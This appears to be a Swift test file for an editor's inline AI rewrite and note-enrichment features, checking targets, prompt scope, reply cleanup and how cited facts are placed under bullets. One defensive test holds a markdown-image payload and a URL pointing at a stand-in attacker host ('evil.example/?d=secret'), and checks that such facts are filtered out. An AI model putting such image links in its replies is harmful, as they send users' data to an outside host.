@testable import FenCore
import Foundation
import Testing

@Suite("Inline AI: target, prompt, reply (issue #6)")
struct InlineAITests {
    // MARK: - Target

    @Test("a selection is the target, whatever its length")
    func selectionTarget() throws {
        let doc = "Alpha beta.\n\nSecond paragraph."
        let target = try #require(EditorTarget.resolve(in: doc, selected: NSRange(location: 0, length: 5)))
        #expect(target.kind == .selection)
        #expect(target.text == "Alpha")
    }

    @Test("with no selection the target is the paragraph around the caret")
    func paragraphTarget() throws {
        let doc = "First line\nstill first.\n\nSecond paragraph here.\n\nThird."
        let caret = (doc as NSString).range(of: "paragraph").location
        let target = try #require(EditorTarget.resolve(in: doc, selected: NSRange(location: caret, length: 0)))
        #expect(target.kind == .paragraph)
        #expect(target.text == "Second paragraph here.")
        #expect((doc as NSString).substring(with: target.range) == target.text)
    }

    @Test("a blank line, whitespace, a bad range and huge text give no target")
    func noTarget() {
        let doc = "One.\n\n\nTwo."
        #expect(EditorTarget.resolve(in: doc, selected: NSRange(location: 5, length: 0)) == nil)
        #expect(EditorTarget.resolve(in: "   \n  ", selected: NSRange(location: 0, length: 3)) == nil)
        #expect(EditorTarget.resolve(in: doc, selected: NSRange(location: 50, length: 2)) == nil)
        let huge = String(repeating: "a", count: EditorTarget.maximumLength + 1)
        #expect(EditorTarget.resolve(in: huge, selected: NSRange(location: 0, length: huge.utf16.count)) == nil)
    }

    // MARK: - Prompt

    private let target = EditorTarget.resolve(
        in: "Intro.\n\nShip fast.", selected: NSRange(location: 8, length: 10)
    )!

    @Test("scope Selection sends only the selected text")
    func selectionScope() throws {
        let built = try InlineRewrite.request(
            instruction: "Expand", scope: .selection, target: target,
            document: "Intro.\n\nShip fast.", workspaceID: nil, label: "a.md"
        )
        #expect(built.context.map(\.text) == ["Ship fast."])
        #expect(!built.prompt.contains("Intro"))
        #expect(built.prompt.contains("Expand"))
    }

    @Test("scope Whole document sends the document, and only then")
    func documentScope() throws {
        let id = UUID()
        let built = try InlineRewrite.request(
            instruction: "Expand", scope: .document, target: target,
            document: "Intro.\n\nShip fast.", workspaceID: id, label: "a.md"
        )
        #expect(built.context.map(\.text) == ["Intro.\n\nShip fast."])
        #expect(built.context.first?.workspaceID == id)
    }

    @Test("a document over the limit is refused instead of cut")
    func documentTooLarge() {
        let big = String(repeating: "word ", count: InlineRewrite.maxDocumentCharacters)
        #expect(throws: AIError.contextTooLarge) {
            try InlineRewrite.request(
                instruction: "x", scope: .document, target: target, document: big, workspaceID: nil, label: "a.md"
            )
        }
    }

    // MARK: - Reply

    @Test("the reply keeps the spaces and line breaks around the original")
    func keepsSurroundingSpace() {
        #expect(InlineRewrite.cleaned("  New text.\n", original: "  Old text.\n") == "  New text.\n")
        #expect(InlineRewrite.cleaned("New", original: "Old") == "New")
    }

    @Test("a fence around the whole reply is removed, but not one the original had")
    func fenceRemoved() {
        #expect(InlineRewrite.cleaned("```markdown\nHello\n```", original: "Hi") == "Hello")
        let code = "```swift\nlet a = 1\n```"
        #expect(InlineRewrite.cleaned("```swift\nlet b = 2\n```", original: code) == "```swift\nlet b = 2\n```")
    }

    @Test("an empty reply stays empty")
    func emptyReply() {
        #expect(InlineRewrite.cleaned("  \n ", original: "Old") == "")
    }
}

@Suite("Enrich: bullets, facts and placement (issue #6)")
struct EnrichmentTests {
    private let passages = [
        Passage(
            workspaceID: UUID(), workspaceName: "Notes", relativePath: "infra/ingress.md",
            heading: "Ingress > Timeouts", startLine: 3,
            text: "The ingress controller closes idle connections after sixty seconds."
        ),
        Passage(
            workspaceID: UUID(), workspaceName: "Notes", relativePath: "billing.md",
            heading: "", startLine: 1,
            text: "Invoices go out on the first day of every month."
        ),
    ]

    @Test("it finds list items and skips code fences")
    func findsBullets() {
        let text = "- ingress timeouts\n  - detail\n1. second item\n```\n- not a bullet\n```\n* [ ] task item"
        let bullets = Enrichment.bullets(in: text)
        #expect(bullets.map(\.text) == ["ingress timeouts", "detail", "second item", "task item"])
        #expect(bullets.map(\.number) == [1, 2, 3, 4])
        #expect(bullets[0].hasChildren)
        #expect(bullets[0].insertAfter == 1)
        #expect(!bullets[2].hasChildren)
    }

    @Test("a scheduled run takes only short bullets without sub-bullets")
    func shorthandOnly() {
        let long = "- " + Array(repeating: "word", count: 20).joined(separator: " ")
        let text = "- short one\n- with child\n  - child\n\(long)"
        #expect(Enrichment.bullets(in: text, shorthandOnly: true).map(\.text) == ["short one", "child"])
    }

    @Test("facts need a citation that is a real passage and shares a word with it")
    func factValidation() {
        let reply = """
        B1:
        - Idle connections close after sixty seconds [1]
        - Totally unrelated claim about whales [1]
        - A claim with no citation at all
        - A claim citing a missing passage [7]
        B2: NONE
        """
        let facts = Enrichment.facts(in: reply, bulletCount: 2, passages: passages)
        #expect(facts == [EnrichmentFact(bullet: 1, text: "Idle connections close after sixty seconds", sources: [1])])
    }

    @Test("a fact with an image, link, HTML, URL, or wikilink is dropped")
    func factMarkupDropped() {
        let reply = """
        B1:
        - Idle connections close ![x](https://evil.example/?d=secret) [1]
        - Idle connections close [here](notes.md) [1]
        - Idle connections close <img src=x> [1]
        - Idle connections close, see https://evil.example [1]
        - Idle connections close, see [[Other note]] [1]
        - Idle connections close after sixty seconds [1]
        """
        let facts = Enrichment.facts(in: reply, bulletCount: 1, passages: passages)
        #expect(facts.map(\.text) == ["Idle connections close after sixty seconds"])
    }

    @Test("it reads a few ways models write the header, and several citations")
    func replyShapes() {
        let reply = "**B1:** Invoices go out monthly [2]\nB2:\n* Idle connections close [1, 2]"
        let facts = Enrichment.facts(in: reply, bulletCount: 2, passages: passages)
        #expect(facts.map(\.bullet) == [1, 2])
        #expect(facts[1].sources == [1, 2])
        #expect(facts[0].text == "Invoices go out monthly")
    }

    @Test("a bullet number the prompt never had is ignored")
    func unknownBullet() {
        let facts = Enrichment.facts(in: "B9:\n- Invoices go out monthly [2]", bulletCount: 2, passages: passages)
        #expect(facts.isEmpty)
    }

    @Test("facts go under their bullet, with links, and no original line changes")
    func placement() {
        let text = "Intro\n- ingress timeouts\n  - existing note\n- unrelated thing\n- invoices"
        let bullets = Enrichment.bullets(in: text)
        let facts = [
            EnrichmentFact(bullet: 1, text: "Idle connections close after sixty seconds", sources: [1]),
            EnrichmentFact(bullet: 4, text: "Invoices go out monthly", sources: [2]),
        ]
        let outcome = Enrichment.apply(facts, to: text, bullets: bullets, passages: passages, from: "notes/today.md")
        #expect(outcome.enriched == [1, 4])
        #expect(outcome.unchanged == [2, 3])
        #expect(outcome.factCount == 2)
        let lines = outcome.text.components(separatedBy: "\n")
        #expect(lines == [
            "Intro",
            "- ingress timeouts",
            "    - Idle connections close after sixty seconds ([Timeouts](../infra/ingress.md#timeouts))",
            "  - existing note",
            "- unrelated thing",
            "- invoices",
            "    - Invoices go out monthly ([billing](../billing.md))",
        ])
        // Every original line is still there, in order.
        var remaining = lines[...]
        for line in text.components(separatedBy: "\n") {
            guard let index = remaining.firstIndex(of: line) else {
                Issue.record("original line lost: \(line)")
                return
            }
            remaining = remaining[(index + 1)...]
        }
    }

    @Test("a bullet and its sub-bullet can both get facts")
    func nested() {
        let text = "- outer\n  - inner"
        let facts = [
            EnrichmentFact(bullet: 1, text: "Invoices go out monthly", sources: [2]),
            EnrichmentFact(bullet: 2, text: "Idle connections close after sixty seconds", sources: [1]),
        ]
        let outcome = Enrichment.apply(
            facts, to: text, bullets: Enrichment.bullets(in: text), passages: passages, from: "a.md"
        )
        #expect(outcome.text.components(separatedBy: "\n") == [
            "- outer",
            "    - Invoices go out monthly ([billing](billing.md))",
            "  - inner",
            "      - Idle connections close after sixty seconds ([Timeouts](infra/ingress.md#timeouts))",
        ])
    }

    @Test("running it twice adds nothing the second time")
    func idempotent() {
        let text = "- ingress timeouts"
        let facts = [EnrichmentFact(bullet: 1, text: "Idle connections close after sixty seconds", sources: [1])]
        let first = Enrichment.apply(
            facts, to: text, bullets: Enrichment.bullets(in: text), passages: passages, from: "a.md"
        )
        let second = Enrichment.apply(
            facts, to: first.text, bullets: Enrichment.bullets(in: first.text), passages: passages, from: "a.md"
        )
        #expect(second.text == first.text)
        #expect(second.enriched.isEmpty)
        #expect(second.summary.contains("Nothing was changed"))
    }

    @Test("the summary names bullets that stay as they were")
    func summary() {
        var outcome = EnrichmentOutcome(text: "")
        outcome.enriched = [1]
        outcome.unchanged = [2, 3]
        outcome.factCount = 2
        #expect(outcome.summary == "Added 2 facts under 1 of 3 bullets. 2 had no source and stay as it was.")
    }

    @Test("a link target uses the same id the preview gives the heading")
    func anchorMatchesRenderer() throws {
        let result = try MarkdownRenderer().render("# Idle Timeouts: v2!\n\ntext", options: .init())
        let slug = try #require(result.headings.first?.slug)
        #expect(HeadingAnchor.slug("Idle Timeouts: v2!") == slug)
    }
}
